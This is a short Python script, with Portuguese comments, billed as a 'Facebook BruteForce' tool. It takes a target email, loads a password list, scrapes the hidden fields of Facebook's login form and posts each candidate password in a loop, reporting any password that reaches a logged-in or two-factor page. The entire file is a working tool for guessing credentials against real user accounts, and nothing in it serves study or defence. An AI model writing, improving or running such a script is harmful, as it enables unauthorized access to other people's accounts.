import time
import sys
import requests
from bs4 import BeautifulSoup

# Verificar a versão do Python
if sys.version_info[0] != 3:
    print('''--------------------------------------
    REQUIRED PYTHON 3.x
    Use: python fb2.py
    --------------------------------------
    ''')
    sys.exit()

post_url = 'https://www.facebook.com/login.php'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}

print('\n---------- Welcome to Facebook BruteForce ----------\n')

# Ler o arquivo de senhas
try:
    with open('passwords.txt', 'r') as file:
        passwords = file.readlines()
except FileNotFoundError:
    print('Erro: O arquivo passwords.txt não foi encontrado.')
    sys.exit()

email = input('Enter Email/Username: ').strip()

print("\nTarget Email ID:", email)
print("\nTrying passwords from the list...")

session = requests.Session()

# Loop para tentar cada senha
i = 0
for passw in passwords:
    passw = passw.strip()
    i += 1
    if len(passw) < 6:
        continue
    
    print(f"{i} : {passw}")
    
    # Obter o conteúdo da página de login para verificar cookies e tokens
    response = session.get(post_url, headers=headers)
    if response.status_code == 200:
        # Usar BeautifulSoup para fazer parse do HTML e encontrar o form token
        soup = BeautifulSoup(response.text, 'html.parser')
        form_data = {input['name']: input.get('value', '') for input in soup.find_all('input') if input.get('name')}
        form_data['email'] = email
        form_data['pass'] = passw
        
        # Enviar o POST para tentar fazer login
        response = session.post(post_url, data=form_data, headers=headers)

        if 'Find Friends' in response.text or 'Two-factor authentication' in response.text or 'security code' in response.text:
            print('Your password is:', passw)
            break

    else:
        print(f"Error {response.status_code} while trying to log in")
    
    # Aguardar antes de tentar novamente
    print('\nSleeping for 1 seconds...\n')
    time.sleep(1)
